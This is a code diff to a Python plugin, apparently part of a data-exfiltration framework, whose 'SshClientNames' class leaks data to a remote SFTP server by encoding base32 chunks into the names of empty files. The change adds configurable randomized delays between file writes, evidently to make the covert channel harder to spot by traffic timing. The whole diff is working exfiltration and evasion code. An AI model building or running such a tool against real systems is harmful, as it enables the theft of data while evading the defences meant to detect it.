@@ -1,7 +1,7 @@
 
 from __future__ import annotations
 from typing import Dict, Any, Iterable
-import base64, paramiko
+import base64, paramiko, time, random
 
 from tfg.plugins.api import ExfilClientPlugin
 
@@ -21,6 +21,8 @@ class SshClientNames(ExfilClientPlugin):
         pkey_path = config.get("pkey_path")
         remote_dir = config.get("remote_dir") or "."
         exfil_id = config.get("exfil_id") or "tfg"
+        ritmo_base = int(config.get("ritmo_base_ms") or 0)
+        ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
 
         key = paramiko.RSAKey.from_private_key_file(pkey_path) if pkey_path else None
         ssh = paramiko.SSHClient(); ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -35,10 +37,14 @@ class SshClientNames(ExfilClientPlugin):
                 while len(buf) >= RAW_SLICE:
                     part = bytes(buf[:RAW_SLICE]); del buf[:RAW_SLICE]
                     token = b32(part); name = f"{exfil_id}.{seq:06d}.{token}"
+                    if ritmo_base or ritmo_disp:
+                        time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
                     sftp.file(name, "wb").close()
                     total += len(part); seq += 1
             if buf:
                 token = b32(bytes(buf)); name = f"{exfil_id}.{seq:06d}.{token}"
+                if ritmo_base or ritmo_disp:
+                    time.sleep(max(0.0, (ritmo_base + random.uniform(-ritmo_disp, ritmo_disp)) / 1000.0))
                 sftp.file(name, "wb").close()
                 total += len(buf); seq += 1
             sftp.file(f"{exfil_id}.EOT", "wb").close()
